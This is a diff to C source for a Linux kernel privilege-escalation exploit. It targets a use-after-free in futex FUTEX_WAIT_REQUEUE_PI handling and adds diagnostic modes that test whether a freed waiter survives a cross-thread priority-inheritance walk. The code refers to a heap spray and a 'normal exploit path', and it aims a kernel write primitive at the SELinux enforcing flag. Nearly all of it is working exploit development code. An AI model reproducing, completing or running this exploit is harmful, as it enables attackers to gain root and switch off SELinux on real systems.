@@ -80,36 +80,55 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
+  int diag = env_int_range("DIAG", 0, 0, 9);
   errno = 0;
   long futex_ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
   int futex_errno = errno;
-  if (env_flag("DIAG_SKIP_SELECT", 0)) {
-    pr_info("DIAG: futex_wait_requeue_pi ret=%ld errno=%d\n", futex_ret, futex_errno);
-    pr_info("DIAG: f_wait=%u f_pi_target=%u f_pi_chain=%u\n",
-            f_wait, f_pi_target, f_pi_chain);
 
-    pr_info("DIAG: test 1 — setpriority on waiter tid=%d (shallow stack)\n", tid);
-    errno = 0;
-    long r1 = syscall(SYS_setpriority, PRIO_PROCESS, tid, 19);
-    pr_info("DIAG: test 1 ret=%ld errno=%d\n", r1, errno);
-
-    pr_info("DIAG: test 2 — sched_setscheduler on waiter tid=%d\n", tid);
-    errno = 0;
-    struct sched_param sp_param = { .sched_priority = 0 };
-    long r2 = syscall(SYS_sched_setscheduler, tid, 3 /*SCHED_BATCH*/, &sp_param);
-    pr_info("DIAG: test 2 ret=%ld errno=%d\n", r2, errno);
-
-    pr_info("DIAG: test 3 — sched_setattr on waiter tid=%d (deep stack)\n", tid);
-    errno = 0;
-    long r3 = sched_setattr_tid(tid, 10);
-    pr_info("DIAG: test 3 ret=%ld errno=%d\n", r3, errno);
-
-    pr_info("DIAG: all tests passed, no crash\n");
+  if (diag == 1) {
+    /* DIAG=1: Cross-thread PI walk, waiter idle (no syscalls after futex).
+     * The consumer calls sched_setattr from its OWN kernel stack.
+     * The waiter's kernel stack is idle — freed waiter data should be intact.
+     * NO pr_info/usleep here to avoid clobbering the waiter's kernel stack.
+     * Wait on punch_consume_go (set to 0 by consumer AFTER sched_setattr returns),
+     * NOT consumer_calls (set BEFORE sched_setattr — would race). */
+    atomic_store(&punch_consume_go, 1);
+    while (atomic_load(&punch_consume_go) != 0)
+      __asm__ volatile("yield" ::: "memory");
+    /* Consumer finished sched_setattr. Safe to use kernel stack now. */
+    int calls = atomic_load(&consumer_calls);
+    int success = atomic_load(&consumer_success);
+    pr_info("DIAG=1: futex ret=%ld errno=%d\n", futex_ret, futex_errno);
+    pr_info("DIAG=1: consumer calls=%d success=%d\n", calls, success);
+    pr_info("DIAG=1: PASSED — cross-thread PI walk survived\n");
     atomic_store(&route_done, 1);
     futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
     while (!atomic_load(&owner_chain_done)) usleep(1000);
     return NULL;
   }
+
+  if (diag == 2) {
+    /* DIAG=2: Cross-thread PI walk, waiter idle, WITH userspace activity
+     * between futex return and PI walk (pr_info = write syscall).
+     * Tests if intermediate syscalls clobber the freed waiter. */
+    pr_info("DIAG=2: futex ret=%ld errno=%d, doing userspace activity...\n",
+            futex_ret, futex_errno);
+    pr_info("DIAG=2: now signaling consumer for cross-thread PI walk\n");
+    atomic_store(&punch_consume_go, 1);
+    while (atomic_load(&punch_consume_go) != 0)
+      __asm__ volatile("yield" ::: "memory");
+    int calls = atomic_load(&consumer_calls);
+    int success = atomic_load(&consumer_success);
+    pr_info("DIAG=2: consumer calls=%d success=%d\n", calls, success);
+    pr_info("DIAG=2: PASSED\n");
+    atomic_store(&route_done, 1);
+    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    while (!atomic_load(&owner_chain_done)) usleep(1000);
+    return NULL;
+  }
+
+  /* DIAG=3 or higher: fall through to normal exploit path (do_pselect_fake_lock_route).
+   * Use PSELECT_SHIFT=N to test specific shift values. */
   do_pselect_fake_lock_route();
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
@@ -414,13 +433,13 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
-  if (env_flag("DIAG_FUTEX_ONLY", 0)) {
-    pr_info("DIAG_FUTEX_ONLY: testing futex requeue PI without heap spray\n");
+  int diag_mode = env_int_range("DIAG", 0, 0, 9);
+  if (diag_mode == 1 || diag_mode == 2) {
+    pr_info("DIAG=%d: skipping heap spray, testing futex+PI path directly\n", diag_mode);
     pselect_child_node = 1;
     set_pselect_write_mode(data_addr(SELINUX_ENFORCING), 0, 1);
-    pr_info("DIAG: starting futex threads\n");
     run_main_route_threads();
-    pr_info("DIAG: run_main_route_threads returned OK\n");
+    pr_info("DIAG=%d: run_main_route_threads returned OK\n", diag_mode);
     clear_pselect_write();
     return 0;
   }
